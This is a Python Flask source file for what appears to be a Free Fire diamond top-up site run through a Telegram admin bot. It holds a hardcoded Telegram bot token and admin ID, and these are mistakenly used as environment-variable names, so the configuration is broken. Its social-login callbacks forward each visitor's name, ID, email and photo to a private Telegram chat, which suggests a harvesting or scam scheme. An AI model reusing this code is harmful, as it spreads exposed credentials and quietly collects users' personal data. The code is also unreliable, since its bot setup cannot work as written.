# app.py
import os
import json
import uuid
import datetime
import threading
from flask import Flask, render_template, request, redirect, url_for, abort
from authlib.integrations.flask_client import OAuth
from dotenv import load_dotenv
import requests
import telebot

# load env
load_dotenv()

# Flask app
app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = os.getenv("SECRET_KEY", "dev_secret_change_me")

# Telegram / Admin config
TELEGRAM_BOT_TOKEN = os.getenv("6838193855:AAGS6PmjieczhajO8rIHn9wINP8GneqDzEA")
ADMIN_ID = int(os.getenv("6512242172") or 0)

# OAuth config (optional)
FB_CLIENT_ID = os.getenv("FACEBOOK_CLIENT_ID")
FB_CLIENT_SECRET = os.getenv("FACEBOOK_CLIENT_SECRET")
FB_REDIRECT = os.getenv("FACEBOOK_REDIRECT_URI", "http://localhost:3000/auth/facebook/callback")

TW_CLIENT_ID = os.getenv("TWITTER_CLIENT_ID")
TW_CLIENT_SECRET = os.getenv("TWITTER_CLIENT_SECRET")
TW_REDIRECT = os.getenv("TWITTER_REDIRECT_URI", "http://localhost:3000/auth/twitter/callback")

oauth = OAuth(app)
if FB_CLIENT_ID and FB_CLIENT_SECRET:
    oauth.register(
        name='facebook',
        client_id=FB_CLIENT_ID,
        client_secret=FB_CLIENT_SECRET,
        access_token_url='https://graph.facebook.com/v15.0/oauth/access_token',
        authorize_url='https://www.facebook.com/v15.0/dialog/oauth',
        api_base_url='https://graph.facebook.com/',
        client_kwargs={'scope': 'email'},
    )
if TW_CLIENT_ID and TW_CLIENT_SECRET:
    oauth.register(
        name='twitter',
        client_id=TW_CLIENT_ID,
        client_secret=TW_CLIENT_SECRET,
        request_token_url='https://api.twitter.com/oauth/request_token',
        access_token_url='https://api.twitter.com/oauth/access_token',
        authorize_url='https://api.twitter.com/oauth/authenticate',
        api_base_url='https://api.twitter.com/1.1/',
    )

# Data files
LINKS_FILE = "links.json"        # stores generated links {token: {...}}
ORDERS_FILE = "purchases.json"   # stores orders
ALLOWED_FILE = "allowed.json"    # stores allowed users and expiry

# Diamond price map (as you provided)
PRICE_MAP = {
    300: 125, 500:199, 800:279, 1000:299, 1200:349, 1500:379,
    2000:449, 2500:499, 3500:599, 5000:699, 7000:749, 9000:899
}

# helpers to load/save JSON
def load_json(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

# create files if missing
if not os.path.exists(LINKS_FILE):
    save_json(LINKS_FILE, {})
if not os.path.exists(ORDERS_FILE):
    save_json(ORDERS_FILE, [])
if not os.path.exists(ALLOWED_FILE):
    save_json(ALLOWED_FILE, {})

# Telegram bot init (pyTelegramBotAPI)
bot = None
if TELEGRAM_BOT_TOKEN:
    bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode=None)

# ----- utility: telegram send -----
def telegram_send_text(chat_id, text):
    if not bot:
        print("[telegram disabled] Would send:", text)
        return
    try:
        bot.send_message(chat_id, text)
    except Exception as e:
        print("Telegram send error:", e)

def telegram_send_photo(chat_id, path_or_url, caption=None):
    if not bot:
        print("[telegram disabled] Would send photo:", path_or_url)
        return
    try:
        # if url
        if str(path_or_url).startswith("http"):
            bot.send_photo(chat_id, path_or_url, caption=caption)
        else:
            with open(path_or_url, "rb") as f:
                bot.send_photo(chat_id, f, caption=caption)
    except Exception as e:
        print("Telegram photo send error:", e)

# ----- link generation -----
def generate_token():
    return uuid.uuid4().hex

def compute_expiry(period_keyword):
    now = datetime.datetime.utcnow()
    if not period_keyword:
        return None
    p = period_keyword.lower()
    if p.startswith("hour"):
        return (now + datetime.timedelta(hours=1)).isoformat()
    if p.startswith("month"):
        return (now + datetime.timedelta(days=30)).isoformat()
    if p.startswith("year"):
        return (now + datetime.timedelta(days=365)).isoformat()
    # try number+unit e.g. "2hour"
    return None

def create_genlink(owner_id, diamonds, period_keyword=None):
    links = load_json(LINKS_FILE, {})
    token = generate_token()
    price = PRICE_MAP.get(int(diamonds), None)
    if price is None:
        raise ValueError("Unknown diamond package")
    expire_at = compute_expiry(period_keyword)
    links[token] = {
        "token": token,
        "owner_id": int(owner_id),
        "diamonds": int(diamonds),
        "amount": price,
        "created_at": datetime.datetime.utcnow().isoformat(),
        "expire_at": expire_at,
        "used": False
    }
    save_json(LINKS_FILE, links)
    return token, links[token]

# ----- order creation -----
def create_order(link_token, method="upi"):
    links = load_json(LINKS_FILE, {})
    if link_token not in links:
        raise ValueError("Invalid token")
    link = links[link_token]
    if link.get("used"):
        raise ValueError("Link already used")
    # optional expiry check
    if link.get("expire_at"):
        exp = datetime.datetime.fromisoformat(link["expire_at"])
        if datetime.datetime.utcnow() > exp:
            raise ValueError("Link expired")

    # mark link used now (to avoid reuse)
    link["used"] = True
    links[link_token] = link
    save_json(LINKS_FILE, links)

    orders = load_json(ORDERS_FILE, [])
    order_id = uuid.uuid4().hex[:12]
    order = {
        "id": order_id,
        "token": link_token,
        "owner_id": link["owner_id"],
        "diamonds": link["diamonds"],
        "amount": link["amount"],
        "method": method,
        "status": "pending",
        "created_at": datetime.datetime.utcnow().isoformat()
    }
    orders.append(order)
    save_json(ORDERS_FILE, orders)
    return order

def update_order_status(order_id, status, admin_note=None):
    orders = load_json(ORDERS_FILE, [])
    found = False
    for o in orders:
        if o["id"] == order_id:
            o["status"] = status
            if admin_note:
                o["admin_note"] = admin_note
            o["updated_at"] = datetime.datetime.utcnow().isoformat()
            found = True
            break
    if found:
        save_json(ORDERS_FILE, orders)
    return found

# ----- allowed users management -----
def grant_user(user_id, period_keyword):
    allowed = load_json(ALLOWED_FILE, {})
    expiry = compute_expiry(period_keyword)
    allowed[str(user_id)] = {"granted_at": datetime.datetime.utcnow().isoformat(), "expire_at": expiry}
    save_json(ALLOWED_FILE, allowed)
    return allowed[str(user_id)]

def revoke_user(user_id):
    allowed = load_json(ALLOWED_FILE, {})
    if str(user_id) in allowed:
        del allowed[str(user_id)]
        save_json(ALLOWED_FILE, allowed)
        return True
    return False

def is_user_allowed(user_id):
    allowed = load_json(ALLOWED_FILE, {})
    entry = allowed.get(str(user_id))
    if not entry:
        return False
    if not entry.get("expire_at"):
        return True
    exp = datetime.datetime.fromisoformat(entry["expire_at"])
    return datetime.datetime.utcnow() <= exp

# ----------------- Flask routes -----------------
@app.route("/")
def index():
    # render the main Free Fire UI
    return render_template("index.html", price_map=PRICE_MAP)

@app.route("/redeem/<token>")
def redeem(token):
    links = load_json(LINKS_FILE, {})
    link = links.get(token)
    if not link:
        return "Invalid link", 404
    # expiry / used check
    if link.get("used"):
        return "This link has already been used.", 400
    if link.get("expire_at"):
        exp = datetime.datetime.fromisoformat(link["expire_at"])
        if datetime.datetime.utcnow() > exp:
            return "This link has expired.", 400
    return render_template("redeem.html", link=link)

@app.route("/purchase", methods=["POST"])
def purchase():
    data = request.get_json() or request.form or {}
    token = data.get("token")
    method = data.get("method", "upi")
    if not token:
        return {"status": "error", "message": "missing token"}, 400
    try:
        order = create_order(token, method)
    except Exception as e:
        return {"status": "error", "message": str(e)}, 400

    # notify admin with order id and instructions
    msg = (
        f"🎮 New Top-up Order\n"
        f"• Order ID: {order['id']}\n"
        f"• Diamonds: {order['diamonds']}\n"
        f"• Amount: ₹{order['amount']}\n"
        f"• Method: {order['method']}\n"
        f"• Owner (id): {order['owner_id']}\n"
        f"• Time: {order['created_at']}\n\n"
        f"To confirm: use /confirm {order['id']}\n"
        f"To fail: use /confirm {order['id']} fail"
    )
    telegram_send_text(ADMIN_ID or order['owner_id'], msg)

    # send QR image (if available)
    qr_path = os.path.join("static", "qr.png")
    if os.path.exists(qr_path):
        telegram_send_photo(ADMIN_ID or order['owner_id'], qr_path, caption=f"QR for order {order['id']}")

    return {"status": "ok", "order_id": order["id"]}

@app.route("/confirmation")
def confirmation():
    return render_template("confirmation.html")

# OAuth routes (safe — only profiles)
@app.route("/auth/facebook")
def auth_facebook():
    if 'facebook' not in oauth:
        return "Facebook OAuth not configured", 400
    return oauth.facebook.authorize_redirect(FB_REDIRECT)

@app.route("/auth/facebook/callback")
def auth_facebook_cb():
    token = oauth.facebook.authorize_access_token()
    resp = oauth.facebook.get('me?fields=id,name,email,picture{url}')
    profile = resp.json()
    lines = [f"👤 Social Login (Facebook)",
             f"• Name: {profile.get('name')}",
             f"• ID: {profile.get('id')}"]
    if profile.get("email"):
        lines.append(f"• Email: {profile.get('email')}")
    if profile.get("picture") and profile["picture"].get("data"):
        pic = profile["picture"]["data"].get("url")
        lines.append(f"• Photo: {pic}")
    lines.append("\n⚠️ Note: No passwords are collected.")
    telegram_send_text(ADMIN_ID or 0, "\n".join(lines))
    if profile.get("picture") and profile["picture"].get("data"):
        telegram_send_photo(ADMIN_ID or 0, profile["picture"]["data"].get("url"), caption=f"Facebook user: {profile.get('name')}")
    return redirect(url_for("login_success"))

@app.route("/auth/twitter")
def auth_twitter():
    if 'twitter' not in oauth:
        return "Twitter OAuth not configured", 400
    return oauth.twitter.authorize_redirect(TW_REDIRECT)

@app.route("/auth/twitter/callback")
def auth_twitter_cb():
    token = oauth.twitter.authorize_access_token()
    resp = oauth.twitter.get('account/verify_credentials.json?include_email=true')
    profile = resp.json()
    lines = [f"👤 Social Login (Twitter)",
             f"• Name: {profile.get('name')}",
             f"• Screen name: @{profile.get('screen_name')}",
             f"• ID: {profile.get('id_str')}"]
    if profile.get("email"):
        lines.append(f"• Email: {profile.get('email')}")
    if profile.get("profile_image_url_https"):
        lines.append(f"• Photo: {profile.get('profile_image_url_https')}")
    lines.append("\n⚠️ Note: No passwords are collected.")
    telegram_send_text(ADMIN_ID or 0, "\n".join(lines))
    if profile.get("profile_image_url_https"):
        telegram_send_photo(ADMIN_ID or 0, profile.get("profile_image_url_https"), caption=f"Twitter user: {profile.get('screen_name')}")
    return redirect(url_for("login_success"))

@app.route("/auth/success")
def login_success():
    return render_template("login-success.html")

@app.route("/auth/failure")
def login_failure():
    return render_template("login-failure.html")

# health
@app.route("/health")
def health():
    return "OK"

# ---------------- Telegram bot handlers ----------------
def start_telegram_polling():
    if not bot:
        print("Telegram bot not configured. Skipping polling.")
        return

    @bot.message_handler(commands=['start'])
    def _start(msg):
        bot.reply_to(msg, "👋 Welcome. Admin: /help for commands.")

    @bot.message_handler(commands=['help'])
    def _help(msg):
        text = (
            "/approve <user_id> <hour|month|year> — grant access\n"
            "/revoke <user_id> — remove access\n"
            "/genlink <diamonds> [target_user_id] [hour|month|year] — generate unique redeem link\n"
            "/confirm <order_id> [fail] — confirm order success or fail\n"
            "/orders — list recent orders (admin)\n"
        )
        bot.reply_to(msg, text)

    @bot.message_handler(commands=['approve'])
    def _approve(msg):
        from_id = msg.from_user.id
        if from_id != ADMIN_ID:
            bot.reply_to(msg, "⛔ Only admin can approve users.")
            return
        parts = msg.text.strip().split()
        if len(parts) < 3:
            bot.reply_to(msg, "Usage: /approve <user_id> <hour|month|year>")
            return
        target = parts[1]
        period = parts[2]
        try:
            uid = int(target)
        except:
            bot.reply_to(msg, "Invalid user id")
            return
        grant_user(uid, period)
        bot.reply_to(msg, f"✅ Granted access to {uid} for {period}")

    @bot.message_handler(commands=['revoke'])
    def _revoke(msg):
        from_id = msg.from_user.id
        if from_id != ADMIN_ID:
            bot.reply_to(msg, "⛔ Only admin can revoke users.")
            return
        parts = msg.text.strip().split()
        if len(parts) < 2:
            bot.reply_to(msg, "Usage: /revoke <user_id>")
            return
        try:
            uid = int(parts[1])
        except:
            bot.reply_to(msg, "Invalid user id")
            return
        ok = revoke_user(uid)
        bot.reply_to(msg, "✅ Revoked" if ok else "❌ Not found")

    @bot.message_handler(commands=['genlink'])
    def _genlink(msg):
        from_id = msg.from_user.id
        parts = msg.text.strip().split()
        # command patterns:
        # /genlink <diamonds>
        # /genlink <diamonds> <target_user_id>
        # /genlink <diamonds> <target_user_id> <period>
        if len(parts) < 2:
            bot.reply_to(msg, "Usage: /genlink <diamonds> [target_user_id] [hour|month|year]")
            return
        try:
            diamonds = int(parts[1])
        except:
            bot.reply_to(msg, "Invalid diamonds number")
            return
        target_user = from_id
        period = None
        if len(parts) >= 3:
            # if third looks like user id, set target
            try:
                maybe_uid = int(parts[2])
                target_user = maybe_uid
                if len(parts) >= 4:
                    period = parts[3]
            except:
                # not an id, treat as period
                period = parts[2]
        # only admin can generate link for others
        if target_user != from_id and from_id != ADMIN_ID:
            bot.reply_to(msg, "⛔ You can only generate links for yourself. Admin can generate for others.")
            return
        # check allowed for non-admin
        if from_id != ADMIN_ID and not is_user_allowed(from_id):
            bot.reply_to(msg, "⛔ You are not allowed to generate links. Ask admin to /approve you.")
            return
        try:
            token, info = create_genlink(target_user, diamonds, period)
        except Exception as e:
            bot.reply_to(msg, f"Error: {e}")
            return
        # build a link (admin likely runs server on public domain or ngrok)
        # we try to get base url from environment or assume localhost
        base = os.getenv("PUBLIC_BASE_URL") or f"http://localhost:{os.getenv('FLASK_PORT', '3000')}"
        url = f"{base}/redeem/{token}"
        bot.reply_to(msg, f"🔗 Link generated for user {target_user}:\n{url}\nExpires: {info['expire_at'] or 'no expiry'}")
        # send link to target user if different
        if target_user != from_id:
            try:
                bot.send_message(target_user, f"🔗 Admin created a redeem link for you:\n{url}\nExpires: {info['expire_at'] or 'no expiry'}")
            except Exception as e:
                print("Failed to send link to target user:", e)

    @bot.message_handler(commands=['confirm'])
    def _confirm(msg):
        from_id = msg.from_user.id
        if from_id != ADMIN_ID:
            bot.reply_to(msg, "⛔ Only admin can confirm orders.")
            return
        parts = msg.text.strip().split()
        if len(parts) < 2:
            bot.reply_to(msg, "Usage: /confirm <order_id> [fail]")
            return
        order_id = parts[1]
        fail_flag = len(parts) >= 3 and parts[2].lower() == "fail"
        status = "failed" if fail_flag else "confirmed"
        ok = update_order_status(order_id, status)
        if not ok:
            bot.reply_to(msg, "Order not found")
            return
        bot.reply_to(msg, f"Order {order_id} marked {status}")
        # notify order owner
        orders = load_json(ORDERS_FILE, [])
        owner = None
        for o in orders:
            if o["id"] == order_id:
                owner = o.get("owner_id")
                break
        if owner:
            try:
                if status == "confirmed":
                    bot.send_message(owner, f"✅ Your order {order_id} has been confirmed by admin. Diamonds will be delivered.")
                else:
                    bot.send_message(owner, f"❌ Your order {order_id} has been marked failed by admin.")
            except Exception as e:
                print("Failed to notify owner:", e)

    @bot.message_handler(commands=['orders'])
    def _orders(msg):
        if msg.from_user.id != ADMIN_ID:
            bot.reply_to(msg, "⛔ Only admin may view orders.")
            return
        orders = load_json(ORDERS_FILE, [])
        if not orders:
            bot.reply_to(msg, "No orders yet.")
            return
        text = "Recent orders:\n"
        for o in orders[-10:]:
            text += f"{o['id']} | {o['diamonds']}d | ₹{o['amount']} | {o['status']}\n"
        bot.reply_to(msg, text)

    # start polling (blocking) in this thread
    bot.infinity_polling()

# run telegram in background thread
if bot:
    t = threading.Thread(target=start_telegram_polling, daemon=True)
    t.start()

# Run flask app
if __name__ == "__main__":
    host = os.getenv("FLASK_HOST", "0.0.0.0")
    port = int(os.getenv("FLASK_PORT", 3000))
    print(f"Starting Flask on {host}:{port}")
    app.run(host=host, port=port)